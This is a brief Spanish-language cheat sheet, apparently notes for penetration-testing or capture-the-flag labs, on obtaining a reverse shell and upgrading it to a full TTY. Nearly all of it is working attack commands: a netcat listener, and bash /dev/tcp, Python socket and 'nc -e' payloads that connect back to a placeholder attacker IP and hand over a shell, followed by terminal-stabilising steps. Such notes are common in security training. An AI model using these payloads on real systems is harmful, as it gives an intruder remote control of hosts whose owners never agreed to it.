# Reverse shell y mejora de TTY

## Listener
nc -lvnp 4444

## Payloads (IP = tu tun0, puerto 4444)
bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("TU_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
nc -e /bin/bash TU_IP 4444

## Mejorar la shell (TTY completa)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, luego:
export TERM=xterm; stty rows 38 columns 116
